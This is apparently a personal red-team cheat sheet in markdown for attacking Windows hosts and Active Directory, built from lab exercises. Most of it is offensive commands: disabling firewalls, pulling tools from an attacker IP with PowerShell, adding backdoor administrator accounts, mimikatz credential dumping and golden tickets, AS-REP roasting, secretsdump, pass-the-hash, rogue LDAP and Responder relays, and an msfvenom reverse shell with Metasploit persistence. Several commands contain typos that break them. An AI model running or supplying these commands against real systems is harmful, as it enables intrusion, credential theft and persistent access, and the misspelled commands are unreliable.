# WINDOWS

# Commands
- systeminof
  - part of Active Directory (workgroup / domain)
- wmic = Windows Management Instrumentation Command-line
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local syste?


- Find AV
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
  - Test-NetConnection 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr = grep
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"

- check permision
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln

- powershell.exe
  
## Stabilize and Post Exploit windows
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup Administrators/"Backup Operators"/"Remote Management Users"/"Remote Desktop Users" Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000
  - wmic useraccount get name,sid

# ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)
- Definitions
  - Domain: group of users/computers under a adm
  - Domain Controler: server that runs AD. Provides AD services + control all
  - AD: repository/database where this users/computers are
  - Organizational Unit (OU): containers inside AD, classify user/machines. Apply policies
    - Group Policy Objects
      - network distribution: gpupdate /force
      - SYSVOL: shared networ
  - AD Domains: collection of components within AD
  
- Tree: several domains
- Forestr: domains trust each other
  - Union several trees + different namespace
  - Trust Relationshing
- Enterprese Admins: over all domains

- Objects
  - User:
    - People
    - Service: database, printer, service user
  - Machines
    - computer that joins AD domain
    - local administrator on machine self
    - password rotated + 120 characters
    - DC01 = machnie name | DC01$ = machine account name
  - Security Groups
    - groups and machines
    - Domain Admin, Server|Backup|Account Operators, Domain Users|COmputer|Controllers
    - grant permission over resources

- Credentials
  - Domain Controllers
    - Kerberos
    - NetNTLM

## KERBEROS
- authentication service
- ticket system
- Steps
  - Key Distribution Center (KDC) ==> generate Ticket Granting Ticket (TGT) ==> Ticket Granting Service
- Enumerate users
  - kerbrute userenum -d domain --dc domain string wordlist.txt
- Rubel.exe (in the victim's machine) to find hashes
- mimikatz for golden ticket
  - lsadump::lsa /inject /name:USERNAME
  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
  - msic::cmd ==> access other machine

## Commands
- Reset password
  - set-ADAccountPassword USER -Reset -NewPassword (Read-Host -AsSecurestring -Prompt '123456') - Verbose
  - Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose


### Credential Injection
- runas.exe
  - inject credential into memory
  - runas.exe /netonly /user:<domain>\<username> cmd.exe
  - check SYSVOL

## BREACHING
- Steps
  - get access to one account at least
  - enumerate once inside
  - phishing and OSINT

- Accounts
  - Builin/Administrator = local admin
  - Domain Admin: all resources
  - Entrepreise admin: forest root
  - schema admin: modify domain/forest
  - server operator: manage domain server
  - account operator: manage users

### NTLM
- New technology LAN Manager
- Challenge-Response - Net-NTLM
- security protocols for authentication
- password spraying (one password, several users)

### LDAP
- Lightweight Directory Access Protocol
- direct verify credentials
- Pass-back
  - rogue LDAP server
  - OpenLDAP: install slapd ldap-utils && sudo systemctl enable slapd
  - sudo dpkg-reconfigure -p low slapd
  - downgrade own ldap server
  - dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

### Authentication Relays
- SMB = Server Message Block
  - Communication Client-Server on Microsoft AD

- Make client communicate to Rogue AD
  - send poisoned response
  - race condition
  - Responder ==> intercept connections (similar to wifi)

### MDT
- Microsoft Deployment Toolkit
  - deploy images
  - MSCCM = Microsoft System Center COnfiguration Manager = updates
- with PXE
  - *.bcd = info for PXE boot
  - Download those files
    - tftp -i IP GET "\Tmp\file.bcs" name
    - powershell -executionpolicy bypass
    - Import-Module .\PowerPXE.ps1
      - Get-WimFile -bcdFile file.conf ==> PXE boot image
    - Extract image
      - inject local admin
      - Exfiltrate credentials = Get-FindCredentials -WimFile FILE

### Config Files
- web config files
- service
- registry keys
- centrally deployed applications
- antivirus-files
  - sqlitebrowser file.db
- Tools
  - seatbelt: https://github.com/GhostPack/Seatbelt

## ENUMERATING
- With GUI:
  - xfreerdp /d:za.tryhackme.com /u:'kimberley.smith' /p:'Password!' /v:thmjmp1.za.tryhackme.com
  - Microsoft Management COnsole (MMC)
  
- cmd
  - net-command
  - net user /domain
    - net user.name /domain
  - net group /domain
    - net group "group-name" /domain
  - net accounts /domain = password policy
  
- Powershell
  - get-ADuser -Identity USER -Server SERVER -Properties *
    - -Filter 'Name -like "*smt"'
    - | Format-Table Name,Smt -A
  - get-ADGroup
  - Get-ADGroupMember
  - Get-ADObject
    - Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
  - get-Addomain
  - Change
    - set-ADAccountPassword

### BLOODHOUND
- Sharphound
  - Gather information
  - Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
  - https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

- Bloodhound: create graphic
  - graphical interface
  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
- In the target:
  - Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
- in the attacker
  - neo4j console => database
  - bloodhound
    - import looted files



# COMMANDS
- systeminfo ==> command
  - Os config + Domain
  - Domain = AD
  - Workgroup = local workgroup
- getAdUser -Filter*
  - show all ad user account
  - -Searchbase "CN=Users,DC=THMREDTEAM,DC=COM"
    - Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"

- port 139/445
- Enum4linux = Enumerate
- kerbrute = brute force in kerberus active directory
  - Find users
    - kerbrute userenum -d domain --dc ip word_list.txt
- Find user without password (NP)
  - GetNPUsers.py --no-pass -usersfiles {wordlist.txt} domain.com/ -dc-ip [IP-address]
- find other hashes
  - secretsdump.py -dc-ip ip host.local/user@ip
- Pass the hash
  - evil-winrm -i IP -u USERNAME -H hash



# PERSISTANCE
- Identify segemtns: vlans, dmz
- IDS, IPDS, Endpoint Detection and Response
- 
- Logs
  - sysmon: logger
    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Enumerate services, hidden folders and process, shared files/printers

## POWERVIEW
- enumrate domains on windows
  - powershell -ep bypass ==> allow run script
  - . .\PowerView.ps1
- Get-ChildItem function: ==> commands
 - Introduction: https://medium.com/@browninfosecguy/an-introduction-to-powerview-bdfd953f2c4c
   - $scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
   - $scriptFunctions | Format-Wide -Column 4
   - Get-NetDomainController
   - Get-DomainPoliciy
   - get-netuser | select-object displayname,samaccountname  
   - Get-UserProperties -Properties 
   - get-netcomputer
   - [help] get-command
   - get-help Get-NetComputer -examples
   - Get-NetGroupMember
   - Get-NetGPO  / Invoke-ShareFinder = shares


## MIMIKATZ
- dumping credentials   
- mimikatz.exe
  - privilege::debug ==> Check if we are admin
    -lsadump::lsa /patch 


## create reverse shell
- msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
- use exploit/multi/handler
- use exploit/windows/local/persistence